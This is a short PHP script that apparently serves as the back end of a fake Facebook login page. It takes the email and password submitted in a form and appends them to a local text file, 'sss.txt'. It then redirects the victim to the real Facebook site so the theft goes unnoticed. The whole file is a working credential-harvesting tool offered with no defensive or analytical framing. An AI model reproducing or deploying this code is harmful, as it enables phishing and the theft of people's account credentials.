<?php
$uname=$_POST['email'];
$pass=$_POST['pass'];

$temp = file_get_contents("sss.txt");
$myfile = fopen("sss.txt", "w") or die("Unable to open file!");



$txt = " $temp \t $uname \t $pass | \n";
fwrite($myfile, $txt);
fclose($myfile);


header('Location: https://www.facebook.com/');
?>